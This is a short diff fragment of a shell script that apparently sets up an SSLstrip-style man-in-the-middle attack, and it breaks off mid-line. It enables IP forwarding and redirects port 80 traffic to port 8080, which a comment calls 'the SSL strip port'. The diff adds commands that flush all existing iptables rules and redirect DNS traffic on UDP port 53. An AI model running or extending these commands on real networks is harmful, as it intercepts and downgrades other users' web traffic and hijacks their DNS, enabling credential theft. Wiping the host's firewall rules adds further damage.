@@ -39,11 +39,16 @@ sleep 1
 echo -n "[+] Ip forwarding is now set to "
 cat /proc/sys/net/ipv4/ip_forward && echo
 sleep 0.5
-
+echo "[+] Flushing existing iptables rules"
+iptables --flush
+iptables --flush -t nat
+sleep 3
 echo "[+] Redirecting port 80 to port 8080"
 #This will redirect the HTTP/S traffic to the SSL strip port 
 iptables -t nat -I  PREROUTING 1 -p tcp --destination-port 80 -j REDIRECT --to-port 8080
 sleep 3
+echo "[+] Redirecting udp port 53"
+iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53
 #Enable the port 8080 to accept tcp traffic
 echo "[+] Changing port 8080 permissions"
 sleep
